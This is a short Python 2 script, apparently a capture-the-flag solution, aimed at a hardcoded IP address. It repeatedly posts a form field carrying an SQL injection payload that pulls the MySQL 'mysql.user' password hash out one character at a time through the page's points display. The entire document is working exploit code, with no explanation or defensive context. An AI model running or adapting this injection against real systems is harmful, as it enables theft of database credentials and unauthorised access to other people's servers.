#coding=utf-8
import requests
import re
rs = requests.session()
url = "http://47.52.137.90:20000/"

def flag():
    key = ""
    for j in xrange(0,30):
        i = "1"+"+1"*j
        data = {'flag':'0',
                'hi': "+conv(hex(substr((select pw nienie from mysql.user group by nienie),"+str(i)+",1)),16,10)#"
                }
        r1 = rs.post(url,data = data)
        # print data
        # print r1.text
        if 'sorry' in r1.text:
            print 'sorry'
            exit(0)
        if 'fuck' in r1.text:
            print 'fuck'
            exit(0)
        # print r1.text
        r1 = re.findall("<grey>My Points</grey> | (.*)<br/>",r1.content)[1]
        # print type(r1)
        # print r1
        if r1 !='NULL':
            if int(r1)!=0:
                print chr(int(r1))+" -------------- "+str(j)
                key += chr(int(r1))

    print key

flag()